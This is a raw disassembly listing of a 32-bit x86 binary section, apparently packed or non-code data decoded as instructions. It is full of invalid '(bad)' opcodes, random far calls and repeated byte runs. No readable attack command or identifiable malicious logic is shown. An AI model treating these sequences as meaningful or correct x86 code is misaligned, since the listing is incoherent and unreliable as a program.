  41b072:	call   0xc9dc7cab
  41b077:	pop    ebp
  41b078:	add    esi,eax
  41b07a:	aaa    
  41b07b:	(bad)  
  41b07d:	mov    cl,0x4f
  41b07f:	popa   
  41b080:	add    BYTE PTR [eax],al
  41b082:	push   ss
  41b083:	inc    esi
  41b084:	outs   dx,DWORD PTR ds:[esi]
  41b085:	add    BYTE PTR [eax],al
  41b087:	jno    0x41b086
  41b089:	fild   DWORD PTR [eax]
  41b08b:	add    BYTE PTR [edx-0x379c21e3],cl
  41b091:	fnstenv [esi+0x6654bb82]
  41b097:	push   0x56b983c1
  41b09c:	shl    ah,0x2c
  41b09f:	pop    ebp
  41b0a0:	mov    edx,0x9671f4
  41b0a5:	add    BYTE PTR [eax],al
  41b0a7:	mov    ?,WORD PTR [ebx-0x7f3b0000]
  41b0ad:	add    BYTE PTR [eax],al
  41b0af:	add    BYTE PTR [ebx-0x74747475],cl
  41b0b5:	mov    ecx,DWORD PTR [ebx+0x6dcd8b8b]
  41b0bb:	sub    bh,bl
  41b0bd:	stc    
  41b0be:	lea    esp,fs:[edx]
  41b0c1:	dec    esi
  41b0c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0c3:	call   0x496f:0xf1bd6373
  41b0ca:	and    dl,BYTE PTR [ebp+0x1c815980]
  41b0d0:	sub    BYTE PTR [ebp-0x72727273],cl
  41b0d6:	lea    ecx,[ebp+0x8d8d]
  41b0dc:	xor    BYTE PTR [edi],bh
  41b0de:	ja     0x41b0ca
  41b0e0:	add    BYTE PTR [eax],al
  41b0e2:	ror    BYTE PTR [esp+eiz*8+0x73],0x6e
  41b0e7:	das    
  41b0e8:	add    esi,0xa600e142
  41b0ee:	cmp    DWORD PTR [ebx-0x5],0x8a0c6240
  41b0f5:	push   0xe786ff9
  41b0fa:	push   eax
  41b0fb:	adc    DWORD PTR [edi+eax*4],esi
  41b0fe:	push   edx
  41b0ff:	adc    esp,DWORD PTR [eax]
  41b101:	scas   eax,DWORD PTR es:[edi]
  41b102:	cmp    DWORD PTR [eax-0x2e],0xb8dd0000
  41b109:	add    BYTE PTR [eax],al
  41b10b:	shr    cl,0x16
  41b10e:	add    BYTE PTR [eax],al
  41b110:	in     al,dx
  41b111:	add    eax,0xabeca4dc
  41b116:	ror    DWORD PTR ds:0x8ce99a44,cl
  41b11c:	sub    esp,0x75
  41b11f:	stos   BYTE PTR es:[edi],al
  41b120:	push   esi
  41b121:	iret   
  41b122:	xchg   esp,eax
  41b123:	jge    0x41b125
  41b125:	iret   
  41b126:	push   edi
  41b127:	sbb    eax,DWORD PTR [eax]
  41b129:	add    BYTE PTR [eax],al
  41b12b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b12c:	imul   edi,DWORD PTR [eax+0x6],0xf0487bc4
  41b133:	imul   esi,esi,0xf52be8a6
  41b139:	dec    edi
  41b13a:	js     0x41b101
  41b13c:	mov    ch,0xf8
  41b13e:	mov    bh,0x4e
  41b140:	call   0xf2b06f69
  41b145:	shl    DWORD PTR [ecx],0x82
  41b148:	add    BYTE PTR [eax],al
  41b14a:	xchg   BYTE PTR [ebp+ebx*2+0x0],bh
	...
  41b159:	mov    al,ds:0xffff8318
  41b15e:	(bad)  
  41b15f:	(bad)  
  41b160:	(bad)  
  41b161:	(bad)  
  41b162:	(bad)  
  41b163:	(bad)  
  41b164:	dec    esp
  41b166:	int3   
  41b167:	fmul   DWORD PTR [ebp-0x1c3f77c8]
  41b16d:	stos   DWORD PTR es:[edi],eax
  41b16e:	cmp    eax,0x1fe71197
  41b173:	(bad)  
  41b174:	mov    ebx,0xc1e043e9
  41b179:	popa   
  41b17a:	or     BYTE PTR [ecx],dh
  41b17c:	outs   dx,DWORD PTR ds:[esi]
  41b17d:	jne    0x41b1d2
  41b17f:	int3   
  41b180:	int3   
  41b181:	or     eax,0x40ccccef
  41b186:	mov    esi,0x7eaacccc
  41b18b:	dec    ebx
  41b18c:	(bad)  
  41b18d:	daa    
  41b18e:	pop    edx
  41b18f:	push   0x53461a5c
  41b194:	(bad)  
  41b195:	stos   BYTE PTR es:[edi],al
  41b196:	je     0x41b162
  41b198:	jge    0x41b132
  41b19a:	mov    cl,0xe8
  41b19c:	sub    BYTE PTR [esi-0xd],bl
  41b19f:	mov    cl,0x9d
  41b1a1:	int3   
  41b1a2:	call   0x5c437f07
  41b1a7:	call   0xc05f9a94
  41b1ac:	enter  0x3518,0xa5
  41b1b0:	cmp    BYTE PTR [edi+0x3f],ah
  41b1b3:	leave  
  41b1b4:	loop   0x41b225
  41b1b6:	imul   ebp,DWORD PTR [ebp+0x20],0x65707569
  41b1bd:	cs ins DWORD PTR es:[edi],dx
  41b1bf:	ins    DWORD PTR es:[edi],dx
  41b1c0:	outs   dx,BYTE PTR ds:[esi]
  41b1c1:	data16 arpl WORD PTR [edx+0x72],si
  41b1c5:	or     eax,0x206d5320
  41b1ca:	je     0x41b231
  41b1cc:	jb     0x41b241
  41b1ce:	push   ebx
  41b1cf:	and    BYTE PTR [edi+0x65],ch
  41b1d2:	data16 je 0x41b23a
  41b1d5:	push   ebx
  41b1d6:	inc    esp
  41b1d7:	and    bh,BYTE PTR [edx]
  41b1d9:	cs ins DWORD PTR es:[edi],dx
  41b1db:	je     0x41b221
  41b1dd:	ins    DWORD PTR es:[edi],dx
  41b1de:	addr16 addr16 je 0x41b24f
  41b1e2:	cmp    al,0x20
  41b1e4:	push   di
  41b1e6:	jb     0x41b24d
  41b1e8:	gs inc ebx
  41b1ea:	and    BYTE PTR [edi+0x64],dh
  41b1ed:	das    
  41b1ee:	jb     0x41b25d
  41b1f0:	or     eax,0x74622f3a
  41b1f5:	je     0x41b25e
  41b1f7:	ins    DWORD PTR es:[edi],dx
  41b1f8:	(bad)  
  41b1f9:	adc    BYTE PTR [ebp-0x71],al
  41b1fc:	xchg   ebx,eax
  41b1fd:	mov    WORD PTR [ebp-0x510219a9],gs
  41b203:	pop    esp
  41b204:	adc    BYTE PTR [ebp+edx*4-0x63],ah
  41b208:	fdivr  QWORD PTR [ecx+0x6a]
  41b20b:	das    
  41b20c:	xchg   esp,eax
  41b20d:	sub    al,0x9f
  41b20f:	lods   al,BYTE PTR ds:[esi]
  41b210:	call   0xe8456afd
  41b215:	call   0x8dcf4002
  41b21a:	lea    ecx,[ebp-0x72727273]
  41b220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b221:	loop   0x41b227
	...
  41b22b:	add    BYTE PTR [ecx+0x7ab5c89],cl
  41b231:	lds    ecx,FWORD PTR [esi-0x68]
  41b234:	mov    bh,BYTE PTR [eax+0x6c]
  41b237:	or     dl,BYTE PTR ds:0xca303bd0
  41b23d:	dec    ebx
  41b23e:	mov    dh,0xbf
  41b240:	(bad)  
  41b241:	aad    0xc7
  41b243:	or     esp,DWORD PTR [esi]
  41b245:	ret    
  41b246:	mov    DWORD PTR [ecx+0x3447979c],ecx
  41b24c:	dec    esi
  41b24d:	mov    esp,0x193d7a63
  41b252:	cmc    
  41b253:	(bad)  
  41b254:	xchg   edi,eax
  41b255:	jns    0x41b27d
  41b257:	arpl   si,bp
  41b259:	(bad)  
  41b25a:	cmp    DWORD PTR [ebx-0x41a8a2b],esi
  41b260:	aaa    
  41b261:	test   BYTE PTR [ecx-0x71],ch
  41b264:	out    0x89,eax
  41b266:	mov    DWORD PTR [esi],eax
  41b268:	jmp    0x41b256
  41b26a:	mov    DWORD PTR [ecx-0x760fb202],ecx
  41b270:	call   0x1e2831c2
  41b275:	dec    ebp
  41b276:	ret    0x5948
  41b279:	add    bl,BYTE PTR [edi]
  41b27b:	in     al,dx
  41b27c:	(bad)  [ebx]
  41b27e:	dec    eax
  41b27f:	cmp    eax,0xd492b260
  41b284:	outs   dx,BYTE PTR ds:[esi]
  41b285:	pop    eax
  41b286:	std    
  41b287:	push   ebp
  41b288:	fucomip st,st(0)
  41b28a:	call   0xe8efe477
  41b28f:	call   0xe929fec7
  41b294:	call   0x2465d6bd
  41b299:	and    al,0x24
  41b29b:	and    al,0x24
  41b29d:	and    al,0xe0
  41b29f:	fstp   QWORD PTR [ecx-0x25f13730]
  41b2a5:	cmp    eax,0x4644b8d4
  41b2aa:	push   0xffffff91
  41b2ac:	and    BYTE PTR [edi-0x79b3992],ah
  41b2b2:	dec    edi
  41b2b3:	mov    bl,BYTE PTR [eax]
  41b2b5:	xor    BYTE PTR [esp+esi*2+0x74],0x74
  41b2ba:	je     0x41b330
  41b2bc:	je     0x41b332
  41b2be:	je     0x41b245
  41b2c0:	test   DWORD PTR [ecx+0x0],ecx
  41b2c3:	push   edx
  41b2c4:	dec    ebx
  41b2c5:	test   DWORD PTR [ebp+0x78a09bd7],eax
  41b2cb:	jl     0x41b326
  41b2cd:	inc    ebx
  41b2ce:	fnstenv [edi+edx*4-0xd1f9dc]
  41b2d5:	fdiv   DWORD PTR [eax-0x42aa3d98]
  41b2db:	leave  
  41b2dc:	cmp    eax,DWORD PTR [esi+ecx*1-0x2a8fe7c6]
  41b2e3:	pop    ecx
  41b2e4:	mov    ds:0x43457b2f,eax
  41b2e9:	mov    al,BYTE PTR [ebp-0x7a1dc77b]
  41b2ef:	test   ebp,edx
  41b2f1:	and    edx,0xa3780085
  41b2f7:	fwait
  41b2f8:	push   esi
  41b2f9:	jbe    0x41b2a2
  41b2fb:	pop    edi
  41b2fc:	cmp    BYTE PTR [ebx+eiz*1-0x4672ad72],al
  41b303:	js     0x41b36a
  41b305:	adc    DWORD PTR [ebx+esi*2-0x67],edi
  41b309:	push   ebp
  41b30a:	inc    edi
  41b30b:	mov    ds:0x6a,al
  41b310:	pop    edx
  41b311:	mov    cs,WORD PTR [edx]
  41b313:	cs and eax,0x2d866c47
  41b319:	push   eax
  41b31a:	sub    ebx,DWORD PTR [ebx+0x30d37975]
  41b320:	dec    edi
  41b321:	call   0x75c5:0xc43b8325
  41b328:	jle    0x41b352
  41b32a:	adc    bl,dh
  41b32c:	mov    bl,0x0
  41b32e:	add    BYTE PTR [eax+0x68],dh
  41b331:	inc    eax
  41b332:	add    BYTE PTR [eax],al
  41b334:	add    bh,bh
  41b336:	(bad)  
  41b337:	(bad)  
  41b338:	(bad)  
  41b339:	(bad)  
  41b33a:	(bad)  
  41b33b:	(bad)  
  41b33c:	(bad)  
  41b33d:	call   DWORD PTR [edi]
  41b33f:	loop   0x41b2c5
	...
  41b349:	add    BYTE PTR [eax],al
  41b34b:	add    BYTE PTR [eax],bh
  41b34d:	push   ebp
  41b34e:	popa   
  41b34f:	xchg   ebp,eax
  41b350:	dec    edi
  41b351:	cld    
  41b352:	add    eax,0x6c75bd05
  41b357:	pop    edi
  41b358:	or     BYTE PTR [esi+0x52],bl
  41b35b:	adc    BYTE PTR [eax-0x1f],bl
  41b35e:	dec    edx
  41b35f:	imul   eax,DWORD PTR [eax+0x33c3a7],0x4b5200
  41b369:	add    BYTE PTR [edi-0x42ffff5f],bl
  41b36f:	inc    eax
  41b370:	xchg   edx,eax
  41b371:	mov    al,0xed
  41b373:	stos   DWORD PTR es:[edi],eax
  41b374:	push   eax
  41b375:	push   0x24
  41b377:	jae    0x41b3e2
  41b379:	mov    WORD PTR [ebx+eax*8+0x3],?
  41b37d:	aas    
  41b37e:	xor    BYTE PTR [esi+0x21],bl
  41b381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b382:	ret    
  41b383:	(bad)  
  41b385:	fadd   DWORD PTR [eax]
  41b387:	mov    eax,ebp
  41b389:	inc    ebx
  41b38a:	cdq    
  41b38b:	cmc    
  41b38c:	mov    ecx,DWORD PTR [ebx-0x2298f075]
  41b392:	xchg   ebp,eax
  41b393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b394:	(bad)  
  41b395:	pop    esi
  41b396:	mov    eax,0xe7a4892a
  41b39b:	scas   eax,DWORD PTR es:[edi]
  41b39c:	ret    
  41b39d:	repnz bound ecx,QWORD PTR ds:0xd6f79008
  41b3a4:	ja     0x41b3cf
  41b3a6:	mov    BYTE PTR [ebp-0x3d],ch
  41b3a9:	sbb    edx,eax
  41b3ab:	cmp    DWORD PTR [ebx+0x2c],eax
  41b3ae:	test   DWORD PTR [ebp+edi*1+0x1e8b8bdd],esp
  41b3b5:	dec    BYTE PTR [ebx+0x8b8b]
  41b3bb:	add    BYTE PTR [eax],al
  41b3bd:	add    BYTE PTR [eax],al
  41b3bf:	add    BYTE PTR [eax],al
  41b3c1:	add    BYTE PTR [edi],ah
  41b3c3:	jl     0x41b444
  41b3c5:	mov    DWORD PTR [ecx-0x76767677],ecx
  41b3cb:	mov    DWORD PTR [ecx+0x70454589],ecx
  41b3d1:	jb     0x41b42b
  41b3d3:	imul   DWORD PTR [eax+0x3]
  41b3d6:	mov    WORD PTR [esi-0x25],ss
  41b3d9:	ja     0x41b374
  41b3db:	adc    al,0x65
  41b3dd:	addr16 test ah,dh
  41b3e0:	jbe    0x41b45f
  41b3e2:	in     eax,0x5a
  41b3e4:	cmp    al,0x2e
  41b3e6:	inc    ecx
  41b3e7:	gs je  0x41b459
  41b3ea:	gs js  0x41b45d
  41b3ed:	or     eax,0x76202044
  41b3f2:	popa   
  41b3f3:	cs jo  0x41b416
  41b3f6:	push   edi
  41b3f7:	outs   dx,DWORD PTR ds:[esi]
  41b3f8:	and    BYTE PTR [esi],ch
  41b3fa:	dec    ebp
  41b3fb:	jae    0x41b41d
  41b3fd:	cmp    al,0x3c
  41b3ff:	imul   ecx,DWORD PTR ds:0x2e706d63,0xa707376
  41b409:	and    BYTE PTR [ebp+0x65],ah
  41b40c:	ins    DWORD PTR es:[edi],dx
  41b40d:	or     ax,0x6e20
  41b411:	cs push edi
  41b413:	and    BYTE PTR [esi],ch
  41b415:	outs   dx,DWORD PTR ds:[esi]
  41b416:	cs cmp al,0x74
  41b419:	jb     0x41b488
  41b41b:	jb     0x41b482
  41b41d:	jb     0x41b491
  41b41f:	jo     0x41b486
  41b421:	imul   ebp,DWORD PTR [ecx+0x3c],0x73207365
  41b428:	or     dh,BYTE PTR [ebp+ecx*2+0xa]
  41b42c:	outs   dx,BYTE PTR ds:[esi]
  41b42d:	gs jne 0x41b450
  41b430:	bound  edi,QWORD PTR [edi+eiz*2]
  41b433:	jo     0x41b471
  41b435:	and    BYTE PTR [ebp+0x7d],ah
  41b438:	bound  eax,QWORD PTR [eax-0x1b]
  41b43b:	inc    ebp
  41b43c:	inc    ebp
  41b43d:	or     DWORD PTR [esi-0x2bbd1a25],0x49
  41b444:	mov    ebx,DWORD PTR [ebx+ebp*8]
  41b447:	push   eax
  41b448:	inc    edx
  41b449:	aas    
  41b44a:	push   edx
  41b44b:	jns    0x41b42d
  41b44d:	adc    DWORD PTR [esi],0x40c6bf07
  41b453:	inc    edi
  41b454:	pushf  
  41b455:	mov    bl,0x78
  41b457:	imul   ecx,DWORD PTR [ebp-0x65],0x11e14545
  41b45e:	das    
  41b45f:	inc    ebp
  41b460:	inc    ebp
  41b461:	xchg   ebx,eax
  41b462:	mov    ecx,0xb50045cd
  41b467:	push   ebx
  41b468:	xor    DWORD PTR [eax-0x31],ecx
  41b46b:	enter  0xea57,0x99
  41b46f:	add    BYTE PTR [ecx],al
  41b471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b472:	pop    es
  41b473:	push   ecx
  41b474:	xor    BYTE PTR ds:0x1c72d55,0xf5
  41b47b:	or     al,0xf2
  41b47d:	pop    esi
  41b47e:	add    BYTE PTR [eax],al
  41b480:	add    BYTE PTR [edx+0x2f0000b9],bl
  41b486:	xor    al,BYTE PTR [eax]
  41b488:	add    BYTE PTR [eax],al
  41b48a:	je     0x41b500
  41b48c:	je     0x41b502
  41b48e:	je     0x41b504
  41b490:	je     0x41b506
  41b492:	je     0x41b41d
  41b494:	jmp    0x41b477
  41b496:	nop
  41b497:	jno    0x41b450
  41b499:	add    al,ch
  41b49b:	cmp    BYTE PTR ds:0x6f216440,al
  41b4a1:	daa    
  41b4a2:	and    DWORD PTR [edx],ecx
  41b4a4:	into   
  41b4a5:	daa    
  41b4a6:	repz or ebx,esp
  41b4a9:	lds    ecx,FWORD PTR [ecx-0x74747475]
  41b4af:	mov    ecx,DWORD PTR [ebx+0x8b8b8b]
  41b4b5:	add    BYTE PTR [ebx],bh
  41b4b7:	in     eax,dx
  41b4b8:	push   esp
  41b4b9:	je     0x41b4bb
  41b4bb:	add    BYTE PTR ds:0xaa38a0b6,bh
  41b4c1:	add    BYTE PTR [edi],dl
  41b4c3:	inc    esp
  41b4c4:	add    DWORD PTR [ecx],esi
  41b4c6:	aas    
  41b4c7:	dec    edx
  41b4c8:	jae    0x41b522
  41b4ca:	jo     0x41b543
  41b4cc:	test   eax,0xa486521b
  41b4d1:	dec    edx
  41b4d2:	aas    
  41b4d3:	jl     0x41b4ad
  41b4d5:	pushf  
  41b4d6:	gs sar al,1
  41b4d9:	mov    DWORD PTR [ecx-0x75],0x6b5c9e
  41b4e0:	add    BYTE PTR [ecx],dl
  41b4e2:	add    DWORD PTR [eax],0x4cfe6f00
  41b4e8:	add    BYTE PTR [eax],al
  41b4ea:	scas   eax,DWORD PTR es:[edi]
  41b4eb:	jns    0x41b533
  41b4ed:	popf   
  41b4ee:	sbb    al,0x17
  41b4f0:	xchg   edi,eax
  41b4f1:	ret    0x3dcc
  41b4f4:	mov    DWORD PTR [esi+0x4],edi
  41b4f7:	sub    eax,0x2ce899ec
  41b4fc:	mov    cl,dl
  41b4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4ff:	cwde   
  41b500:	or     esp,DWORD PTR [edi+0x0]
  41b503:	add    BYTE PTR [eax],al
  41b505:	adc    bh,bh
  41b507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b508:	stos   BYTE PTR es:[edi],al
  41b509:	scas   al,BYTE PTR es:[edi]
  41b50a:	fistp  QWORD PTR [ebp-0x14]
  41b50d:	sub    BYTE PTR [esi-0x3fe4a01c],ah
  41b513:	je     0x41b574
  41b515:	jae    0x41b520
  41b517:	add    DWORD PTR ds:0x741cc8eb,ecx
  41b51d:	movhps xmm2,QWORD PTR [esi+0xa363]
  41b524:	(bad)  
  41b525:	cli    
  41b526:	push   ebx
  41b527:	add    BYTE PTR [eax],al
  41b529:	add    BYTE PTR [ebx-0x74747475],cl
  41b52f:	mov    ecx,DWORD PTR [ebx+0x53ab8b8b]
  41b535:	(bad)  
  41b536:	jne    0x41b5ad
  41b538:	jne    0x41b5af
  41b53a:	jne    0x41b5b1
  41b53c:	jne    0x41b5b3
  41b53e:	jne    0x41b544
  41b540:	add    al,0x2c
  41b542:	pusha  
  41b543:	in     al,0x3c
  41b545:	sbb    DWORD PTR [ebp+0x1680580a],ecx
  41b54b:	out    0xee,al
  41b54d:	inc    ebp
  41b54e:	(bad)  
  41b54f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b550:	mov    bh,dl
  41b552:	push   fs
  41b554:	fild   DWORD PTR [ebp-0x26]
  41b557:	xchg   BYTE PTR [edx+0x77590404],dl
  41b55d:	add    al,0x4
  41b55f:	jp     0x41b549
  41b561:	add    al,0x4
  41b563:	sbb    dl,ah
  41b565:	xchg   edx,eax
  41b566:	and    DWORD PTR [eax-0x2f03aefd],esi
  41b56c:	dec    edx
  41b56d:	sbb    al,0xad
  41b56f:	and    eax,0x65e96f4d
  41b574:	mov    bh,bh
  41b576:	pop    esp
  41b577:	in     eax,dx
  41b578:	pop    es
  41b579:	pop    es
  41b57a:	add    al,0x4
  41b57c:	add    BYTE PTR [ebx],dl
  41b57e:	jecxz  0x41b5ee
  41b580:	pop    esi
  41b581:	add    BYTE PTR [eax],al
  41b583:	add    BYTE PTR [eax],cl
  41b585:	add    al,0xc8
  41b587:	add    ch,ah
  41b589:	sub    BYTE PTR [ebx],al
  41b58b:	mov    ebp,DWORD PTR [esi]
  41b58d:	iret   
  41b58e:	and    eax,DWORD PTR [ebx-0x51]
  41b591:	es mov ah,0xd8
  41b594:	lea    eax,ds:0xc498deaa
  41b59a:	push   ebp
  41b59b:	fstp   TBYTE PTR [edx+0x4a]
  41b59e:	sbb    BYTE PTR [esi+0xc],ah
  41b5a1:	push   ds
  41b5a2:	fsub   st(7),st
  41b5a5:	dec    edx
  41b5a6:	popf   
  41b5a7:	add    BYTE PTR [eax],al
  41b5a9:	push   ss
  41b5aa:	sbb    DWORD PTR [eax],eax
	...
  41b5b4:	add    BYTE PTR [eax],al
  41b5b6:	add    BYTE PTR [ecx-0x16],bh
  41b5b9:	sbb    eax,DWORD PTR [ebp-0x7a7a7a7b]
  41b5bf:	test   DWORD PTR [ebp+0x8585],eax
  41b5c5:	loop   0x41b602
  41b5c7:	out    0x32,eax
  41b5c9:	pop    ecx
  41b5ca:	cmp    ebp,DWORD PTR [esi+0x3afece42]
  41b5d0:	adc    eax,0x23d9d632
  41b5d5:	push   edi
  41b5d6:	stc    
  41b5d7:	mov    BYTE PTR [eax+0x1d847375],dh
  41b5dd:	add    BYTE PTR [eax],al
  41b5df:	push   ds
  41b5e0:	dec    esi
  41b5e1:	cld    
  41b5e2:	jno    0x41b5ba
  41b5e4:	push   ebx
  41b5e5:	jg     0x41b5b3
  41b5e7:	out    dx,eax
  41b5e8:	xor    BYTE PTR ss:[esi-0x79fc737],bh
  41b5ef:	mov    al,ds:0xfb050b78
  41b5f4:	mov    ebx,0xaf9fa13f
  41b5f9:	sub    al,dh
  41b5fb:	pop    esp
  41b5fc:	add    BYTE PTR [eax],al
  41b5fe:	clc    
  41b5ff:	sti    
  41b600:	rol    DWORD PTR [eax],cl
  41b602:	add    BYTE PTR [eax+0x5],dl
  41b605:	pushf  
  41b606:	add    BYTE PTR [edi],cl
  41b608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b609:	pop    edi
  41b60a:	pop    ss
  41b60b:	jle    0x41b66f
  41b60d:	sbb    al,BYTE PTR [esi]
  41b60f:	add    edi,DWORD PTR [edx+0x43382547]
  41b615:	test   BYTE PTR [esi],dh
  41b617:	in     al,dx
  41b618:	mov    edx,0xce5cadea
  41b61d:	cwde   
  41b61e:	loope  0x41b5fb
  41b620:	(bad)  
  41b621:	(bad)  
  41b622:	cmovl  edx,DWORD PTR [ecx]
  41b625:	(bad)  
  41b626:	(bad)  
  41b628:	push   eax
  41b629:	(bad)  
  41b62a:	(bad)  
  41b62b:	cmovne eax,DWORD PTR [ebp+0x45]
  41b62f:	inc    ebp
  41b630:	inc    ebp
  41b631:	inc    ebp
  41b632:	inc    ebp
  41b633:	inc    ebp
  41b634:	inc    ebp
  41b635:	cmp    eax,0x78ac2bf3
  41b63a:	(bad)  
  41b63b:	mov    WORD PTR [ecx],fs
  41b63d:	push   0x3a03577a
  41b642:	xchg   esp,eax
  41b643:	fisttp WORD PTR [eax]
  41b645:	mov    esp,0x6132ad12
  41b64a:	in     eax,dx
  41b64b:	scas   al,BYTE PTR es:[edi]
  41b64c:	push   edi
  41b64d:	(bad)  
  41b64e:	(bad)  
  41b64f:	(bad)  
  41b650:	(bad)  
  41b651:	(bad)  
  41b652:	(bad)  
  41b653:	(bad)  
  41b654:	(bad)  
  41b655:	sldt   WORD PTR [eax]
  41b658:	mov    dh,BYTE PTR [ecx+0xb8ee]
  41b65e:	pop    esp
  41b65f:	sbb    eax,0x38aa4e1
  41b664:	push   0x75
  41b666:	loope  0x41b673
  41b668:	xor    ah,BYTE PTR [edi+0x1dd6dfd4]
  41b66e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b66f:	or     bl,BYTE PTR es:[edx+0x1c643c1e]
  41b676:	inc    esp
  41b677:	xor    al,0x7a
  41b679:	jae    0x41b685
  41b67b:	pop    ds
  41b67c:	cmc    
  41b67d:	mov    bl,0xe3
  41b67f:	and    bl,BYTE PTR [eax+eax*1+0xce9f00]
  41b686:	add    BYTE PTR [eax],ch
  41b688:	dec    esi
  41b689:	outs   dx,BYTE PTR ds:[esi]
  41b68a:	add    BYTE PTR [eiz*1+0x67edfab8],ah
  41b691:	jns    0x41b620
  41b693:	fs in  al,dx
  41b695:	outs   dx,BYTE PTR ds:[esi]
  41b696:	ds ins DWORD PTR es:[edi],dx
  41b698:	popa   
  41b699:	je     0x41b6bd
  41b69b:	jbe    0x41b70d
  41b69d:	das    
  41b69e:	arpl   WORD PTR gs:[edx+0x65],si
  41b6a2:	cs jb  0x41b719
  41b6a5:	cs cs and BYTE PTR gs:[ebx+0x5d],dh
  41b6ab:	jae    0x41b712
  41b6ad:	and    BYTE PTR [ecx+0x65],ch
  41b6b0:	gs imul eax,DWORD PTR ds:[ecx+0x67],0x2270203c
  41b6b9:	jbe    0x41b730
  41b6bb:	push   0x7072706d
  41b6c0:	outs   dx,BYTE PTR ds:[esi]
  41b6c1:	jae    0x41b728
  41b6c3:	popa   
  41b6c4:	jb     0x41b709
  41b6c6:	cs je  0x41b6e9
  41b6c9:	gs ins BYTE PTR es:[edi],dx
  41b6cb:	inc    ecx
  41b6cc:	and    BYTE PTR [ebp+0x69],ah
  41b6cf:	cs push esp
  41b6d1:	and    BYTE PTR [eax],ah
  41b6d3:	push   ebx
  41b6d4:	outs   dx,DWORD PTR ds:[esi]
  41b6d5:	cs dec ebp
  41b6d7:	jb     0x41b744
  41b6d9:	outs   dx,BYTE PTR ds:[esi]
  41b6da:	jl     0x41b6e3
  41b6dc:	mov    ss,ebx
  41b6de:	(bad)  
  41b6df:	adc    al,0xe9
  41b6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6e2:	mov    edi,0x52a86f0b
  41b6e7:	sbb    eax,0x2424241e
  41b6ec:	fdiv   QWORD PTR [ecx+0x65]
  41b6ef:	cs cmp dl,dh
  41b6f2:	cld    
  41b6f3:	js     0x41b6a7
  41b6f5:	test   dh,dh
  41b6f7:	enter  0xb159,0x77
  41b6fb:	retf   
  41b6fc:	mov    bh,0x44
  41b6fe:	or     al,0xc
  41b700:	adc    BYTE PTR [edi],0x93
  41b703:	pop    esp
  41b704:	push   0xffffffd9
  41b706:	jns    0x41b71f
  41b708:	out    0x24,eax
  41b70a:	and    al,0x39
  41b70c:	sbb    eax,eax
  41b70e:	and    al,0x24
  41b710:	and    al,0x83
  41b712:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  41b719:	sub    DWORD PTR [edx+0xf0feb85],0xf
  41b720:	(bad)  
  41b721:	(bad)  
  41b722:	(bad)  
  41b723:	(bad)  
  41b724:	(bad)  
  41b725:	ud0    edi,edi
  41b728:	pop    esi
  41b729:	sub    esi,DWORD PTR [ebx+0x5a]
  41b72c:	not    BYTE PTR cs:0xd4a60a0f
  41b733:	or     cl,BYTE PTR [ecx]
  41b735:	sub    dh,BYTE PTR [esi-0x59de0903]
  41b73b:	enter  0x144a,0x44
  41b73f:	sbb    al,0xff
  41b741:	dec    DWORD PTR [edx-0x1e]
  41b747:	clc    
  41b748:	(bad)  
  41b749:	jmp    DWORD PTR [edi-0x1e4b5c55]
  41b74f:	leave  
  41b750:	push   ebp
  41b751:	loope  0x41b7af
  41b753:	mov    dh,0x9a
  41b755:	push   esp
  41b756:	and    BYTE PTR [edi+0x33108587],al
  41b75c:	push   eax
  41b75d:	jmp    0x41b772
  41b75f:	shl    DWORD PTR es:[esi],1
  41b762:	(bad)  
  41b763:	call   0x3caf314a
  41b768:	call   0x709a055
  41b76d:	sbb    BYTE PTR [esp+edx*4],ah
  41b770:	and    al,bl
  41b772:	add    cl,0x74
  41b775:	int    0x4c
  41b777:	xchg   edx,eax
  41b778:	mov    al,BYTE PTR [ebp-0x6f125a7a]
  41b77e:	cld    
  41b77f:	ret    
  41b780:	pop    ebp
  41b781:	(bad)  
  41b782:	cmp    DWORD PTR [ecx+0x62adb66e],eax
  41b788:	daa    
  41b789:	jmp    0x41b7c6
  41b78b:	mov    edi,0xe8e8b076
  41b790:	cmp    edx,DWORD PTR [edi-0x18]
  41b793:	call   0x2465dc80
  41b798:	and    al,0x24
  41b79a:	and    al,0x24
  41b79c:	and    al,0x24
  41b79e:	sbb    edx,DWORD PTR [ebp-0x3f3f3f1b]
  41b7a4:	rol    al,0xc0
  41b7a7:	rol    al,0xc0
  41b7aa:	jne    0x41b821
  41b7ac:	dec    DWORD PTR [ebx-0x54501804]
  41b7b2:	ins    DWORD PTR es:[edi],dx
  41b7b3:	neg    BYTE PTR [edx-0x5778f524]
  41b7b9:	retf   0x4714
  41b7bc:	sti    
  41b7bd:	xor    DWORD PTR [edi-0x4fddb76b],ebx
  41b7c3:	mov    edx,0xd4ad7575
  41b7c8:	int    0xca
  41b7ca:	adc    bh,BYTE PTR [ebp-0x65]
  41b7cd:	loop   0x41b761
  41b7cf:	mov    dh,ch
  41b7d1:	push   cs
  41b7d2:	push   ds
  41b7d3:	(bad)  
  41b7d5:	in     al,0x9b
  41b7d7:	jbe    0x41b7d8
  41b7d9:	inc    ebx
  41b7da:	push   ebp
  41b7db:	cwde   
  41b7dc:	inc    ebx
  41b7dd:	mov    WORD PTR [edx],ds
  41b7df:	jle    0x41b7ed
  41b7e1:	xchg   esp,eax
  41b7e2:	add    dh,BYTE PTR [ebp+0x75]
  41b7e5:	mov    eax,ds:0x7575c32f
  41b7ea:	and    eax,0x7539cf
  41b7ef:	fs out dx,eax
  41b7f1:	imul   ecx,DWORD PTR [ecx-0x10],0x6e66db63
  41b7f8:	mov    WORD PTR [edx],gs
  41b7fa:	and    al,0x55
  41b7fc:	cwde   
  41b7fd:	in     al,dx
  41b7fe:	push   es
  41b7ff:	jp     0x41b7d1
  41b801:	jmp    0xf:0xe8916354
  41b808:	add    BYTE PTR [eax],al
  41b80a:	xor    DWORD PTR [edi+0x0],esp
